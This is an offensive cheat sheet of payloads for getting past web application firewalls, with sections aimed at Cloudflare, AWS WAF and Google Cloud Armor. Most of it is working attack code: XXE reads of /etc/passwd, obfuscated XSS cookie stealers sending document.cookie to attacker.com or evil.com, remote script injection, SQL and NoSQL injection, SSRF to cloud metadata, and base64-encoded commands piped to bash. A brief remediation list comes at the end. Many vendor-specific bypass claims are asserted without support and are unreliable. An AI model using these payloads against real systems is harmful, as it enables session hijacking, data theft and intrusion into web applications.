### **🔥 Obfuscating Techniques to bypass WAF detection 🔥**  

>Attackers use **obfuscation techniques** to **bypass Web Application Firewalls (WAFs)** and **evade signature-based detections**. Below are **advanced techniques** for XML, JavaScript, and JSON input manipulation.


- 💡 **Craft payloads** to **each cloud provider** (AWS, Cloudflare, GCP).  
- 💡 **Encoding tricks** like **Base64, Unicode, and JSON nesting**.  
- 💡 **Updated bypass methods**, such as **WebSockets and DNS rebinding**.  

----  

# XML Payload Obfuscation for WAF Bypass  

>Attackers can **encode** or **fragment** XML payloads to bypass WAF detection.  
>WAFs may block known **XXE payloads**, but attackers can **encode entities** to evade detection.  

#### **🚀 UTF-16 Encoding**  

```xml
<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE foo [
  <!ENTITY &#x78;&#x78;&#x65; SYSTEM "file:///etc/passwd">
]>
<root>
    <data>&xxe;</data>
</root>
```

- WAFs expecting **UTF-8** may fail to detect **XXE** in **UTF-16** encoding.  

### **2️⃣ XML Nested Base64 Encoding (Bypassing Pattern Matching)**  

>Some WAFs detect keywords like `SYSTEM`, but attackers can use **base64 encoding**.  

#### **🚀 Example: Base64 Encoded XXE**  

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "data:text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk">
]>
<root>
    <data>&xxe;</data>
</root>
``` 

- The entity **decodes to** `file:///etc/passwd` at runtime.  
- WAF **does not detect direct file inclusion**.  

### **3️⃣ XML Comment Fragmentation (Splitting Payloads)**  

>Instead of using **straightforward** payloads, **comment splitting** can fool WAF regex rules.  

>Comment-Injection Bypass  

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "fi<!-- Bypass WAF -->le:///etc/passwd">
]>
<root>
    <data>&xxe;</data>
</root>
```  

- WAF regex rules searching for `file:///` will **fail** because it's split by a comment.  

----

# JavaScript Code Obfuscation for WAF Evasion  

>JavaScript attacks like **XSS** and **cookie theft** can be obfuscated to bypass WAF detections.  

### JavaScript Hex Encoding Bypass  

>Instead of using **regular payloads**, attackers can **encode characters in hex**.  

#### JavaScript Cookie Stealer (Hex Encoding)  

```js
<script>
    var x = String.fromCharCode(100,111,99,117,109,101,110,116);
    var y = x+"."+String.fromCharCode(99,111,111,107,105,101);
    fetch("http://attacker.com/steal?c="+document[y]);
</script>
```

- **Bypasses keyword detection** for `document.cookie`.  

### IFrame Injection with Character Splicing  

>Splitting JavaScript **keywords** can evade signature-based WAFs.  

#### IFrame Injection for Session Hijacking  

```js
<script>
    var a = "jav";
    var b = "asc";
    var c = "ript:";
    var payload = a + b + c + "alert(document.cookie)";
    document.write("<iframe src='" + payload + "'></iframe>");
</script>
```  

- WAF **does not detect** `javascript:` in **one token**.  

### **3️⃣ Event-Based Payload Execution (Bypassing Script Filters)**  

>If `script` tags are blocked, use **event-based execution**.  

#### **🚀 Example: OnError XSS Bypass**  

```html
<img src=x onerror="fetch('http://attacker.com/log?c='+document.cookie)">
```  
 
- WAFs **may not block `onerror` event handlers**.  

----

# JSON Input Obfuscation for WAF Bypass  

>JSON-based APIs may **validate inputs** strictly, but attackers can **obfuscate payloads**.  

### **1️⃣ JSON Key-Value Case Manipulation (Evasion)**  

>Some WAFs match **JSON key names** exactly. Attackers can **modify case**.

#### **🚀 Mixed-Case Key Evasion**  

```json
{
  "UsErNaMe": "admin",
  "pAsSwOrD": { "$ne": "" }  // Bypass NoSQL authentication
}
```  
  
- WAFs **may not normalize key names**.  

### **2️⃣ JSON Unicode Obfuscation (Breaking Signature Matching)**  

>Instead of using normal text, attackers use **Unicode escapes**.  

#### **🚀 Unicode Encoding Attack**  

```json
{
  "username": "\u0061\u0064\u006d\u0069\u006e",
  "password": "\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u003ealert(1)\u003c/script\u003e"
}
```  
 
- WAFs **fail to recognize** `<script>alert(1)</script>`.  

### **3️⃣ JSON Nesting to Obfuscate SQL Injection**  

>Instead of **direct injection**, use **deeply nested JSON objects**.  

#### **🚀 Nested JSON SQL Injection**  

```json
{
  "user": {
    "info": {
      "name": "' OR 1=1 --"
    }
  }
}
```  

- Some WAFs **fail to parse deeply nested JSON fields**.  

----  

### **🔥 Targeted WAF Bypass Payloads for Cloudflare, AWS WAF, and Other Cloud Providers 🔥**  

>**Advanced WAF bypass techniques** that specifically target **Cloudflare, AWS WAF, and other major cloud WAF solutions**.   
>Below are **bypass methods** for **XSS, SQLi, SSRF, and command injection** against these cloud providers.  

## **1️⃣ Cloudflare WAF Bypass**  

>Cloudflare WAF uses **rule-based filtering, machine learning models, and challenge-response verifications**.  
>**Cloudflare struggles with encoding tricks and header manipulation**.  

### **🔥 Cloudflare XSS Bypass**  

>Cloudflare WAF blocks basic XSS like:  

```html
<script>alert(1)</script>
```  

>**Bypass using `oncut` Event & Character Encoding:**  

```html
<img src="x" oncut="fetch('http://evil.com/cookie?='+document.cookie)">
```  

- Cloudflare does **not inspect `oncut` events**.  
- Uses **DOM-based execution instead of inline `script`**.  

### **🔥 Cloudflare SQL Injection Bypass**  

>Cloudflare detects classic payloads like:  

```sql
' OR '1'='1' --
```  

>**Bypass using JSON Syntax & Whitespace Tricks:**  

```sql
'/**/OR/**/'1'/**/=/**/'1'
```  

>or using **JSON array injection:**  

```sql
' OR JSON_EXTRACT('[{"user":"admin"}]', '$[0].user')='admin'
```  

- Cloudflare does **not tokenize whitespace properly**.  
- JSON queries **bypass traditional SQL filters**.  

### **🔥 Cloudflare SSRF Bypass**  

>Cloudflare blocks:  

```bash
curl http://127.0.0.1:8080/
```  

>**Bypass using `0xHEX` Encoding:**  

```bash
curl http://0x7F000001:8080/  # 127.0.0.1 in hex
```  

- Cloudflare does **not always normalize hex IPs**.  
- `0x7F000001` translates to **127.0.0.1** at the system level.  

### **🔥 Cloudflare Command Injection Bypass**  

>Cloudflare WAF detects:  

```bash
ping -c 4 attacker.com
```  

>**Bypass using Alternative Encoding:**  

```bash
$(echo cGluZyAtYyA0IGF0dGFja2VyLmNvbQo= | base64 -d | bash)
```  

- Encodes the payload in **base64** to avoid pattern detection.  

----

## **2️⃣ AWS WAF Bypass**  

>AWS WAF is **rule-based with rate-limiting & regex filtering**.  
>**AWS fails at handling nested requests and JSON obfuscation**.  

### **🔥 AWS XSS Bypass**  

>AWS WAF blocks:  

```html
<script>alert(1)</script>
```  

>**Bypass using JavaScript Template Literals:**  

```js
fetch`//attacker.com/${document.cookie}`
```  

- AWS WAF **fails to analyze template literals (`fetch\`...\`)**.  

### **🔥 AWS SQL Injection Bypass**  

>AWS WAF blocks:  

```sql
' OR '1'='1' --
```  

>**Bypass using `LIKE` Wildcards:**  

```sql
' OR username LIKE 'a%'
```  

- AWS WAF does **not always block LIKE-based injections**.  

### **🔥 AWS SSRF Bypass**  

>AWS blocks internal IPs (`169.254.169.254`).  

>**Bypass using IPv6 Encodings:**  

```bash
curl http://[::ffff:169.254.169.254]
```  

- AWS WAF **fails to block IPv6-mapped addresses**.  

### **🔥 AWS Command Injection Bypass**  

>AWS blocks:  

```bash
; ls /
```  

>**Bypass using String Concatenation:**  

```bash
$(echo 'bHMgLwo=' | base64 -d)
```  

- AWS WAF **does not inspect base64-decoded commands**.  

----  

## **3️⃣ Google Cloud Armor WAF Bypass**  

>Google Cloud WAF is **strict but fails at handling recursive encoding**.  

### **🔥 Google XSS Bypass**  

>Google blocks:  

```html
<script>alert(1)</script>
```  

>**Bypass using `setTimeout` Encoding:**  

```js
setTimeout("fetch('//attacker.com?c='+document.cookie)", 1000);
```  

- Google does **not analyze `setTimeout` payload execution**.  

### **🔥 Google SQL Injection Bypass**  

>Google blocks:  

```sql
' OR 1=1 --
```  

>**Bypass using CASE Statements:**  

```sql
' OR (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)=1
```  

- Google WAF does **not inspect CASE-based SQL injections**.  

----  

## **Generic WAF Bypass Techniques**  

>These **work against other WAFs**, including Imperva, Akamai, and F5.  

### **🔥 Universal XSS Bypass**  

>Other WAFs block:  

```html
<script>alert(1)</script>
```  

>**Bypass using WebSockets:**  

```js
let ws = new WebSocket('ws://attacker.com');
ws.onopen = () => ws.send(document.cookie);
```  

- **WebSockets** are often **not filtered** by WAFs.  

### **🔥 Universal SQL Injection Bypass**  

>Most WAFs block:  

```sql
' OR '1'='1' --
```  

**Bypass using JSON Nested Queries:**  

```sql
' OR JSON_EXTRACT('{"user":"admin"}', '$.user')='admin'
```  

- WAFs **fail to analyze JSON queries**.  

### **🔥 Universal SSRF Bypass**  

>Most WAFs block:  

```bash
curl http://127.0.0.1/
```  

>**Bypass using `DNS Rebinding`:**  

```bash
curl http://attacker.com.xip.io
```  

- The **DNS resolves back** to `127.0.0.1`.

### **🔥 Universal Command Injection Bypass**  

>Most WAFs block:  

```bash
; ls /
```  

>**Bypass using `${IFS}` Trick:**  

```bash
ls${IFS}/
```  

- WAFs **fail to block whitespace (`IFS`) abuse**.  

----  

# Other Obfuscating Targets  

## **Obfuscating XSS Payload in `User-Agent` HTTP Header to Bypass Filters & WAF**  

>If a **web application stores the `User-Agent` header in the database** on the **user profile**, you can **inject an XSS payload** into it.  
>**WAF rules or input validation may block direct injection**.  
>Below are techniques to **bypass security filters** using different obfuscation methods.  

## **🔹 1️⃣ Basic Payload (Direct Injection)**  

>If there is **no input filtering**, you can try injecting the payload directly:  

```
User-Agent: <img src=x onerror="fetch('http://attacker.com/log?c='+document.cookie)">
```  

>If stored and reflected on a profile page without sanitization, **XSS may executes when the profile is viewed**.

## **🔹 2️⃣ URL Encoding (Basic Obfuscation)**  

>WAFs might detect `onerror=` as malicious. Use URL encoding:  

```
User-Agent: <img src=x onerror=%22fetch('http%3A%2F%2Fattacker.com%2Flog%3Fc%3D'+document.cookie)%22>
```  

>Decoded, it executes:  

```html
<img src=x onerror="fetch('http://attacker.com/log?c='+document.cookie)">
```  

## **🔹 3️⃣ Hexadecimal & Base64 Encoding**  

>Other WAFs block `document.cookie` explicitly. Encode **part of the payload**:  

```
User-Agent: <img src=x onerror="eval(String.fromCharCode(102,101,116,99,104,40,39,104,116,116,112,58,47,47,97,116,116,97,99,107,101,114,46,99,111,109,47,108,111,103,63,99,61,39,+document.cookie,39,39,39,41))">
```  

>Alternatively, encode the entire payload in **Base64** and use JavaScript to decode it:  

```html
User-Agent: <script>eval(atob('ZG9jdW1lbnQuY29va2ll'))</script>
```  

>This decodes `document.cookie` dynamically at runtime.  

## **🔹 4️⃣ Using JavaScript Variables to Split the Payload**  

>If WAFs block specific **keywords** like `document.cookie`, break it into variables:  

```
User-Agent: <img src=x onerror="a='doc';b='ument';c='cookie';fetch('http://attacker.com/log?c='+window[a+b][c])">
```  

>✅ **Bypasses WAFs detecting `document.cookie` as a single string**.  

## **🔹 5️⃣ HTML Encoding (Bypass Reflection Filtering)**  

>If the app **HTML-encodes output**, encode characters:  

```
User-Agent: &lt;img src=x onerror=&quot;fetch(&apos;http://attacker.com/log?c=&apos;+document.cookie)&quot;&gt;
```  

>Decoded on the webpage:  

```html
<img src=x onerror="fetch('http://attacker.com/log?c='+document.cookie)">
```  

>**Bypasses some database sanitization mechanisms**.  

## **🔹 6️⃣ JavaScript `setTimeout()` Delay Execution**  

>If WAFs block scripts **executing immediately**, delay the execution:  

```
User-Agent: <img src=x onerror="setTimeout('fetch(\'http://attacker.com/log?c=\'+document.cookie)', 2000)">
```  

>**Bypasses immediate execution detection**.  

## **🔹 7️⃣ JavaScript Event-Based Execution (Alternative `onerror` Bypass)**  

>Instead of using `onerror=`, try **different event handlers** like `onmouseover`:  

```
User-Agent: <img src=x onmouseover="fetch('http://attacker.com/log?c='+document.cookie)">
```  

>This triggers when a user **moves their mouse** over the profile.  

>**Bypasses WAFs that block `onerror=` but allow other event handlers**.  

## **🔹 8️⃣ Using `eval()` with Encoded Strings**  

```
User-Agent: <script>eval(unescape('%66%65%74%63%68%28%27%68%74%74%70%3a%2f%2f%61%74%74%61%63%6b%65%72%2e%63%6f%6d%2f%6c%6f%67%3f%63%3d%27%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%29'));</script>
```  

>**Bypasses static signature detection in WAFs**.   

----  

## **🔹 9️⃣ Dynamic Script Injection (Bypass CSP)**  

>If the application has **Content Security Policy (CSP)**, try dynamically injecting scripts:  

```
User-Agent: <script>var s=document.createElement('script');s.src='http://attacker.com/payload.js';document.body.appendChild(s);</script>
```  

>Above JavaScript loads a **remote script** dynamically, allowing full **XSS execution**.  

>✅ **Bypasses inline script blocking**.  

----  

## **🔹 🔥 10️⃣ Advanced Mutation Using JavaScript**  

>Strong heavily restricted applications:  

```
User-Agent: <img src=x onerror="this.outerHTML='<svg onload=fetch(`http://attacker.com/log?c=`+document.cookie)>'">
```  

>This **replaces the image tag with an SVG element** that **executes JavaScript**.  

>✅ **Bypasses WAFs filtering `document.cookie` within `<img>` but allowing `<svg>` execution**.

----  

# Selecting Obfuscation?  

| **Bypass Technique** | **Effectiveness** | **Detection Risk** |
|----------------------|------------------|--------------------|
| **URL Encoding** (`%22fetch%28...`) | Low | Easily detected |
| **Hex Encoding** (`String.fromCharCode()`) | Medium | Harder to detect |
| **Base64 Encoding** (`atob()`) | High | Harder to detect |
| **Variable Obfuscation** (`a='doc'; b='ument'`) | Very High | Bypasses most WAFs |
| **JavaScript Delays** (`setTimeout()`) | High | Delays execution |
| **Remote Script Injection** | Very High | Harder to block |  

----  

# Remediation Prevention  

>Defense: How to Stop WAF Bypass Techniques:  

✅ **Normalize Inputs**: Convert all inputs to **lowercase** before validation.  
✅ **Use Web Application Firewalls with Machine Learning**: Modern **AI-based WAFs** can detect obfuscated payloads.  
✅ **Limit Allowed Encoding**: Block requests using **UTF-16, Unicode encoding, and nested Base64**.  
✅ **Use Secure Parsers**:  
✅ For **XML**, disable **DTD processing**.  
✅ For **JSON**, use **strict schema validation**.  
✅ **Rate-Limiting & Anomaly Detection**: Block excessive requests to **detect evasion attempts**.  
